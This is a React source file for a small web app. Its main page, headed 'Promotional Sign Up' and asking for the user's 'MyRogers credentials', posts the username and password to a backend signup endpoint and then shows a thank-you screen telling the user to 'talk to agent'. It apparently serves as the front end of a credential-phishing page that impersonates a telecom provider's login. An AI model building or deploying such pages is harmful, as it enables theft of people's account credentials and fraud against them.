import React, { useState } from 'react';
import axios from 'axios'; // Import necessary components
import './App.css';
import logo from './images/logo2.png'; // Adjust the path to your logo image
import { BrowserRouter as Router, Route, Routes, Navigate, useNavigate, useLocation } from 'react-router-dom';


function Signup() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [message, setMessage] = useState('');
  const navigate = useNavigate(); // Initialize navigate

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post('http://localhost:5000/api/signup', { username, password });
      setMessage(response.data.message);
      // Navigate to the welcome page upon successful signup
      console.log('Navigating to welcome page with username:', username);
      navigate('/welcome', { state: { username } });
 // Pass username to the new page
    }catch (error) {
      console.error('Signup error:', error); // Log the entire error
      let message;
    
      if (error.response) {
        // If there is a response from the server
        message = error.response.data?.message || 'An unknown error occurred';
      } else if (error.request) {
        // If the request was made but no response was received
        message = 'No response received from the server';
      } else {
        // If something else caused the error
        message = error.message || 'An unknown error occurred';
      }
    
      setMessage(message);
    }
    
    
  };

  return (
    <div className="App">
      <div className="signup-container">
        <img src={logo} alt="Logo" className="logo" />
        <h2>Promotional Sign Up</h2>
        <p className="welcome-text">with your MyRogers credentials</p>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <label>
            <input
              type="checkbox"
              checked={rememberMe}
              onChange={(e) => setRememberMe(e.target.checked)}
            />
            Note: It's a one-time registration
          </label>
          <button type="submit">Continue</button>
          {message && <p className="message">{message}</p>}
        </form>
      </div>
    </div>
  );
}

function Welcome() {
  const location = useLocation();
  const username = location.state?.username || 'Guest'; // Safe access to username

  return (
    <div className="App">
      <div className="signup-container">
        <img src={logo} alt="Logo" className="logo" />
        <h2>Thanks, {username}!</h2>
        <p className="welcome-text">You have successfully signed up for this promotion. For further assistance talk to agent.</p>
        {/* You can replicate more of the signup structure if needed */}
      </div>
    </div>
  );
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<Signup />} />
        <Route path="/welcome" element={<Welcome />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </Router>
  );
}

export default App;
